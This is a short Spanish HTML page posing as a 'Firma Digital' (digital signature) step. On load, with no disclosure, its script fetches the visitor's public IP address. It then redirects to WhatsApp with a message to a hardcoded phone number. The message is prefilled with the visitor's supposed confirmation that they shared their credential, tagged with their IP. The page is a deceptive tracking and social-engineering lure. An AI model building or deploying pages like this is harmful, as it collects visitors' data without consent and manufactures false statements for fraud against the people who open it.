<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Firma Digital</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script>
    async function sendIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;
        const phone = '524131136660'; // <-- Reemplaza con tu nÃºmero si es otro
        const message = `Hola,confirmo que he compartido mi credencial, id unico: ${ip}`;
        const waURL = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
        window.location.href = waURL;
      } catch (error) {
        document.getElementById('status').textContent = 'Error al obtener la IP. Intenta de nuevo.';
      }
    }
  </script>
</head>
<body onload="sendIP()" style="font-family: sans-serif; text-align: center; margin-top: 50px;">
  <h2 id="status">Obteniendo IP y abriendo WhatsApp...</h2>
</body>
</html>
